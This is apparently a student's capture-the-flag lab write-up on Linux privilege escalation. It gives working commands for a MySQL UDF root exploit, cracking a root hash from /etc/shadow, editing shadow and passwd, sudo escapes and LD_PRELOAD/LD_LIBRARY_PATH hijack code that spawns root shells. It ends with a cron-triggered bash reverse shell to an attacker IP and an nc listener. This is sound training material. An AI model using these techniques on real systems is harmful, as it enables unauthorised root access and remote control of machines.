# Linux Privilege Escalation

`ssh user@10.10.168.144 -p 22`

Password is **password321**

Upon running the `id` command.

```ad-success
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

---

## Service Exploits

MySQL service is running as root and the root user does not have a password assigned for that service. 

Running MYSQL with root is very bad idea since he/she can pretty much do anything, create a fake account, delete, drop the database, and more.

It is important to split the privileges, one can perform CRUD, and the other can perform the backup or view local table and such.

In this case we found that MYSQL is running root as a user and setted no password.

Answer [here](https://stackoverflow.com/questions/11059493/good-security-in-mysql-web-application-root-not-root).

We can use popular exploit for User Defined Functions [here](https://www.exploit-db.com/exploits/1518).

---

After gaining access we can download the exploit.

In this case
`cd /home/user/tools/mysql-udf`

Compiling the raptor_udf2.c
`gcc -g -c raptor_udf2.c -fPIC   
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc``

After compiling, connect to MYSQL
`mysql -u root`

Execute MYSQL command to create UDF exploit.
`use mysql;   
`create table foo(line blob); `  
`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`

`select * from foo into dumpfile'/usr/lib/mysql/plugin/raptor_udf2.so';`   

`create function do_system returns integer soname 'raptor_udf2.so';``

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission
`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exit MYSQL and run rootbash to open a shell that has root privileges.
`/tmp/rootbash -p`

![[Pasted image 20220726194641.png]]

---

## Weak FIle Permissionns - Readable /etc/shadow

**/etc/shadow** usualyl contains user password hashes and is usually readable only by the root user.

It is **word-writable file** meaning that any user can read,modified, and comprimised other user, Usually word-writable file is only allowed in the **var/tmp** directory since it is intended for storing temporarily files.

After usign `cat /etc/shadow`.
![[Pasted image 20220726195804.png]]

Each line represents a user and in between the first and the second colons is the user's password hash.

Root's hash
**$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0**

Saved root's hash into **hash1.txt**

Uses tool john the ripper for finding weak passwords.

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

![[Pasted image 20220727162452.png]]

John uses a word lists of password called **rockyou.txt** then tries all hashing algorithm to match the hash file given **THM_root_hash.txt**.

Discovered that the hashing algorithm is **sha512crypt** and the password in plain text is **password123**.

---

## Writable /etc/shadow
Again usually readable by the root user.

Since we got the root's password, now it is the time to change its password.

`mkpasswd -m sha-512 newpasswordhere`, this creates a password with a hashing algorithm of sha-512.

Result:
**$6$mTXOoBKLCRhHse0a$APKGID9JaSmOuRLxLhoK0g4cHZidP1u0kjJFJ/7.ATKde8h.pcWYqzw5T5lBQGwb.EnzxmT6usXisFwPhB..c1**

Now we can edit the **/etc/shadow** file and replace the current hash into our new hash.

![[Pasted image 20220727164033.png]]

---

## Writeable /etc/passwd
The **/etc/passwd** directory contains information about the user accounts and same as above usually **word-writable** by root only.

`openssl passwd newpasswordhere`

**Es3PFW5v0MFIc**

Replace current root password to generated password.

![[Pasted image 20220727165127.png]]

Or we can create a new root account, we only need to copy the root's row then put it at the end of the file replacing only the first instance of root to **newroot**.
![[Pasted image 20220727165333.png]]

---

## Sudo - Shell Escape Sequence
We can see all the programs that the **Super Doer** allows us to run by using the 
command `sudo -l`.

![[Pasted image 20220727170031.png|center]]

We can find programs that allows us to elevate privileges via an escape sequence here [gtfobins](https://gtfobins.github.io/).

`sudo find . -exec /bin/sh \; -quit`
![[Pasted image 20220727170659.png|center]]

``` bash
sudo nano | ^R^X |reset; sh 1>&0 2>&0
```

Got shell access.

---

## Sudo - Environment Variables

```ad-info
title: Environment Variables
Is a name/value pair that is set outside of a program, that can be accessed by the program for configuration purposes.
```

**sudo** can be configured to inherit environment variables from the user's environment.

```ad-info
title: LD_PRELOAD and LD_LIBRARY_PATH
**LD_PRELOAD**
It will load a shared object first before any other library(includes C runtime library). More [here](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html)

**LD_LIBRARY_PATH**
List a directories of shared libraries. More [here](https://linuxhint.com/what-is-ld-library-path/)
```

---

**NOTE:** gcc is a compiler for programming languages.

Create a shared **object** using the code located at **/home/user/tools/sudo/preload.c** wherein **.c** is the file extension of C programming language.
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Code content.
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	# Sets the real user id.
	setresuid(0,0,0);
	system("/bin/bash -p");
}

```

This show all environment variables that are inherited.
![[Pasted image 20220729203511.png|center]]

A root shell pops up.
![[Pasted image 20220729203645.png]]

---

`ldd /usr/sbin/apache2` prints out all shared libraries that the program requires.

Creates a shared object from a code located in **gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c**.
```Shell
gcc -o /tmp/libt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Code content.
```C
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}

```

A root shell pops up.
![[Pasted image 20220729203645.png]]

---

## Cron Jobs - File Permissions

A programming, bash, or scripts that runs on schedule depends on what time the user set in.

Cron table files or most commonly known as **Crontab** stores all configuration about **cronjobs** 

Located at **/etc/crontab**.

More info [[Bandit 21-34#Bandit 21|Bandit 21]].

---

![[Pasted image 20220729205129.png]]

```Shell
#!/bin/bash  
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

**bash** allows us to interact with the computer.
**-i** allows for an interactive shell (in image below after listening to port 4444 it allowed us to have a **shell**).
**>&** redirects standard output and standard error in file in question.

**/dev/tcp/ip-address/port** opens a tcp connection to the specified socket.
(10.10.10.10 is the Attacker's IP)
```ad-note
Remember **everything** on Linux is a file.
```

**0>&1** 0 represents **standard input**, 1 represents **standard out**. and 2 represents standard error. 

More here about the command [above](https://www.reddit.com/r/LiveOverflow/comments/a2kahp/comment/eazuui7/).


Listen to any machine that will connect to the temporary server in port **4444**.
```Shell
nc -nvlp 4444
```

Flags explanation:
**-v** output slightly more detailed information on what's happening.
**-n** don't return any **Domain Name System** or **Service lookup** on the specified address, hostnames, or ports.
**-l** listen to any connection (in this case the **bash** script above. it will also acts as a **server**)
**-p** specify the source port.
Since the **cron job** runs every minute we are now connected to the Victim's machine through **nc**.

![[Pasted image 20220729205801.png]]

---

